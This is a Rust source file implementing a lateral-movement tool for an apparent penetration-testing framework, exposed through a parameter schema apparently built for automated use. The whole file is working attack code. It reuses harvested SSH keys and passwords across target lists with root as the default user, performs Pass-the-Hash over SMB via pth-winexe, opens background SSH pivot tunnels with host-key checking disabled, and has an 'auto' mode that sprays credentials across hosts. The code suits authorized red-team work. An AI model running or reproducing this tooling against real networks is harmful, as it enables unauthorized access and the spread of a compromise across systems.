//! Lateral movement tool - pivot to other hosts using harvested credentials

use async_trait::async_trait;
use pentest_core::error::{Error, Result};
use pentest_core::tools::*;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tokio::process::Command;
use tokio::time::Duration;

/// Lateral movement result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LateralMovementResult {
    pub technique: String,
    pub source_host: String,
    pub target_host: String,
    pub success: bool,
    pub method_details: String,
    pub access_level: Option<String>,
}

/// Lateral movement techniques
#[derive(Debug, Clone, Copy)]
pub enum MovementTechnique {
    SshKeyReuse,
    PassTheHash,
    CredentialReuse,
    SshTunneling,
}

/// Lateral movement tool
pub struct LateralMovementTool;

impl LateralMovementTool {
    /// Attempt SSH key reuse
    async fn try_ssh_key_reuse(
        target: &str,
        key_path: &str,
        username: &str,
    ) -> Result<LateralMovementResult> {
        tracing::info!(
            "Attempting SSH key reuse: {}@{} with key {}",
            username,
            target,
            key_path
        );

        let output = Command::new("ssh")
            .args(&[
                "-i",
                key_path,
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "ConnectTimeout=5",
                "-o",
                "BatchMode=yes", // Non-interactive
                &format!("{}@{}", username, target),
                "whoami",
            ])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("SSH command failed: {}", e)))?;

        let success = output.status.success();
        let access_level = if success {
            Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
        } else {
            None
        };

        Ok(LateralMovementResult {
            technique: "SSH Key Reuse".to_string(),
            source_host: "localhost".to_string(),
            target_host: target.to_string(),
            success,
            method_details: format!(
                "SSH key {} for user {}",
                key_path.split('/').last().unwrap_or(key_path),
                username
            ),
            access_level,
        })
    }

    /// Attempt credential reuse (password-based SSH)
    async fn try_credential_reuse(
        target: &str,
        username: &str,
        password: &str,
    ) -> Result<LateralMovementResult> {
        tracing::info!("Attempting credential reuse: {}@{}", username, target);

        let output = Command::new("sshpass")
            .args(&[
                "-p",
                password,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "ConnectTimeout=5",
                &format!("{}@{}", username, target),
                "whoami",
            ])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("sshpass command failed: {}", e)))?;

        let success = output.status.success();
        let access_level = if success {
            Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
        } else {
            None
        };

        Ok(LateralMovementResult {
            technique: "Credential Reuse".to_string(),
            source_host: "localhost".to_string(),
            target_host: target.to_string(),
            success,
            method_details: format!("Password authentication for user {}", username),
            access_level,
        })
    }

    /// Create SSH tunnel for pivoting
    async fn create_ssh_tunnel(
        pivot_host: &str,
        pivot_user: &str,
        target_host: &str,
        target_port: u16,
        local_port: u16,
        key_path: Option<&str>,
    ) -> Result<LateralMovementResult> {
        tracing::info!(
            "Creating SSH tunnel: {} -> {}:{} (local:{})",
            pivot_host,
            target_host,
            target_port,
            local_port
        );

        let mut args = vec![
            "-L".to_string(),
            format!("{}:{}:{}", local_port, target_host, target_port),
            "-N".to_string(), // No command execution
            "-f".to_string(), // Background
            "-o".to_string(),
            "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(),
            "UserKnownHostsFile=/dev/null".to_string(),
        ];

        if let Some(key) = key_path {
            args.push("-i".to_string());
            args.push(key.to_string());
        }

        args.push(format!("{}@{}", pivot_user, pivot_host));

        let output = Command::new("ssh")
            .args(&args)
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("SSH tunnel failed: {}", e)))?;

        let success = output.status.success();

        Ok(LateralMovementResult {
            technique: "SSH Tunneling".to_string(),
            source_host: pivot_host.to_string(),
            target_host: target_host.to_string(),
            success,
            method_details: format!(
                "Tunnel established on localhost:{} -> {}:{}",
                local_port, target_host, target_port
            ),
            access_level: if success {
                Some("Network Pivot".to_string())
            } else {
                None
            },
        })
    }

    /// Attempt Pass-the-Hash (SMB/WinRM on Windows targets)
    async fn try_pass_the_hash(
        target: &str,
        username: &str,
        nt_hash: &str,
    ) -> Result<LateralMovementResult> {
        tracing::info!("Attempting Pass-the-Hash: {}@{}", username, target);

        // Use pth-winexe if available (part of passing-the-hash toolkit)
        let output = Command::new("pth-winexe")
            .args(&[
                "-U",
                &format!("{}%{}", username, nt_hash),
                &format!("//{}", target),
                "cmd.exe",
                "/c",
                "whoami",
            ])
            .output()
            .await;

        match output {
            Ok(result) => {
                let success = result.status.success();
                let access_level = if success {
                    Some(String::from_utf8_lossy(&result.stdout).trim().to_string())
                } else {
                    None
                };

                Ok(LateralMovementResult {
                    technique: "Pass-the-Hash".to_string(),
                    source_host: "localhost".to_string(),
                    target_host: target.to_string(),
                    success,
                    method_details: format!("SMB authentication with NT hash for {}", username),
                    access_level,
                })
            }
            Err(_) => Ok(LateralMovementResult {
                technique: "Pass-the-Hash".to_string(),
                source_host: "localhost".to_string(),
                target_host: target.to_string(),
                success: false,
                method_details: "pth-winexe not available (install passing-the-hash toolkit)"
                    .to_string(),
                access_level: None,
            }),
        }
    }

    /// Scan for SSH key reuse across multiple hosts
    async fn scan_ssh_key_reuse(
        targets: Vec<String>,
        ssh_keys: Vec<(String, String)>, // (key_path, username)
    ) -> Vec<LateralMovementResult> {
        let mut results = Vec::new();

        for target in &targets {
            for (key_path, username) in &ssh_keys {
                if let Ok(result) = Self::try_ssh_key_reuse(target, key_path, username).await {
                    results.push(result);
                    // Small delay between attempts
                    tokio::time::sleep(Duration::from_millis(500)).await;
                }
            }
        }

        results
    }
}

#[async_trait]
impl PentestTool for LateralMovementTool {
    fn name(&self) -> &str {
        "lateral_movement"
    }

    fn description(&self) -> &str {
        "Attempt lateral movement to other hosts using harvested credentials (SSH key reuse, credential reuse, Pass-the-Hash)"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema::new(self.name(), self.description())
            .param(ToolParam::required(
                "targets",
                ParamType::String,
                "Comma-separated list of target hosts (IPs or hostnames)",
            ))
            .param(ToolParam::required(
                "technique",
                ParamType::String,
                "Lateral movement technique: ssh_key, credential, pth, tunnel, auto",
            ))
            .param(ToolParam::optional(
                "username",
                ParamType::String,
                "Username for authentication",
                json!("root"),
            ))
            .param(ToolParam::optional(
                "key_path",
                ParamType::String,
                "Path to SSH private key (for ssh_key technique)",
                json!(null),
            ))
            .param(ToolParam::optional(
                "password",
                ParamType::String,
                "Password (for credential technique)",
                json!(null),
            ))
            .param(ToolParam::optional(
                "nt_hash",
                ParamType::String,
                "NT hash (for pth technique)",
                json!(null),
            ))
            .param(ToolParam::optional(
                "pivot_host",
                ParamType::String,
                "Pivot host for tunneling",
                json!(null),
            ))
            .param(ToolParam::optional(
                "target_port",
                ParamType::Integer,
                "Target port for tunneling",
                json!(22),
            ))
            .param(ToolParam::optional(
                "local_port",
                ParamType::Integer,
                "Local port for tunneling",
                json!(2222),
            ))
    }

    fn supported_platforms(&self) -> Vec<Platform> {
        vec![Platform::Desktop, Platform::Tui]
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> Result<ToolResult> {
        execute_timed(|| async {
            let targets_str = params["targets"]
                .as_str()
                .ok_or_else(|| Error::InvalidParams("targets parameter required".into()))?;
            let targets: Vec<String> = targets_str
                .split(',')
                .map(|s| s.trim().to_string())
                .collect();

            let technique = params["technique"]
                .as_str()
                .ok_or_else(|| Error::InvalidParams("technique parameter required".into()))?;

            let username = params["username"].as_str().unwrap_or("root");
            let key_path = params["key_path"].as_str();
            let password = params["password"].as_str();
            let nt_hash = params["nt_hash"].as_str();
            let pivot_host = params["pivot_host"].as_str();
            let target_port = params["target_port"].as_u64().unwrap_or(22) as u16;
            let local_port = params["local_port"].as_u64().unwrap_or(2222) as u16;

            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("🔀 Lateral Movement Attack");
            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("Technique: {}", technique);
            tracing::info!("Targets:   {} hosts", targets.len());
            tracing::info!("───────────────────────────────────────────────────");

            let mut results = Vec::new();

            match technique.to_lowercase().as_str() {
                "ssh_key" => {
                    let key = key_path
                        .ok_or_else(|| Error::InvalidParams("key_path required for ssh_key technique".into()))?;

                    for target in &targets {
                        if let Ok(result) = Self::try_ssh_key_reuse(target, key, username).await {
                            if result.success {
                                tracing::info!("✅ {} - SUCCESS", target);
                            } else {
                                tracing::info!("❌ {} - FAILED", target);
                            }
                            results.push(result);
                        }
                        tokio::time::sleep(Duration::from_millis(500)).await;
                    }
                }

                "credential" => {
                    let pass = password
                        .ok_or_else(|| Error::InvalidParams("password required for credential technique".into()))?;

                    for target in &targets {
                        if let Ok(result) = Self::try_credential_reuse(target, username, pass).await
                        {
                            if result.success {
                                tracing::info!("✅ {} - SUCCESS as {}", target, result.access_level.as_ref().unwrap());
                            } else {
                                tracing::info!("❌ {} - FAILED", target);
                            }
                            results.push(result);
                        }
                        tokio::time::sleep(Duration::from_millis(500)).await;
                    }
                }

                "pth" => {
                    let hash = nt_hash
                        .ok_or_else(|| Error::InvalidParams("nt_hash required for pth technique".into()))?;

                    for target in &targets {
                        if let Ok(result) = Self::try_pass_the_hash(target, username, hash).await {
                            if result.success {
                                tracing::info!("✅ {} - SUCCESS via Pass-the-Hash", target);
                            } else {
                                tracing::info!("❌ {} - FAILED", target);
                            }
                            results.push(result);
                        }
                        tokio::time::sleep(Duration::from_millis(500)).await;
                    }
                }

                "tunnel" => {
                    let pivot = pivot_host
                        .ok_or_else(|| Error::InvalidParams("pivot_host required for tunnel technique".into()))?;

                    for target in &targets {
                        if let Ok(result) = Self::create_ssh_tunnel(
                            pivot,
                            username,
                            target,
                            target_port,
                            local_port,
                            key_path,
                        )
                        .await
                        {
                            if result.success {
                                tracing::info!("✅ Tunnel established to {}", target);
                            } else {
                                tracing::info!("❌ Tunnel failed to {}", target);
                            }
                            results.push(result);
                        }
                    }
                }

                "auto" => {
                    // Auto mode: try all available techniques
                    tracing::info!("Auto mode: trying all available techniques...");

                    // Try SSH keys if provided
                    if let Some(key) = key_path {
                        for target in &targets {
                            if let Ok(result) = Self::try_ssh_key_reuse(target, key, username).await
                            {
                                if result.success {
                                    tracing::info!("✅ {} - SSH key reuse SUCCESS", target);
                                }
                                results.push(result);
                            }
                        }
                    }

                    // Try credentials if provided
                    if let Some(pass) = password {
                        for target in &targets {
                            if let Ok(result) =
                                Self::try_credential_reuse(target, username, pass).await
                            {
                                if result.success {
                                    tracing::info!("✅ {} - Credential reuse SUCCESS", target);
                                }
                                results.push(result);
                            }
                        }
                    }
                }

                _ => {
                    return Err(Error::InvalidParams(format!(
                        "Unknown technique: {}. Use: ssh_key, credential, pth, tunnel, auto",
                        technique
                    )));
                }
            }

            let successful = results.iter().filter(|r| r.success).count();

            tracing::info!("");
            tracing::info!("Results:");
            tracing::info!("  Attempts:    {}", results.len());
            tracing::info!("  Successful:  {}", successful);
            tracing::info!("  Failed:      {}", results.len() - successful);
            tracing::info!("═══════════════════════════════════════════════════");

            Ok(json!({
                "results": results,
                "summary": {
                    "total_attempts": results.len(),
                    "successful": successful,
                    "failed": results.len() - successful,
                    "success_rate": if results.is_empty() {
                        0.0
                    } else {
                        (successful as f64 / results.len() as f64) * 100.0
                    },
                },
            }))
        })
        .await
    }
}
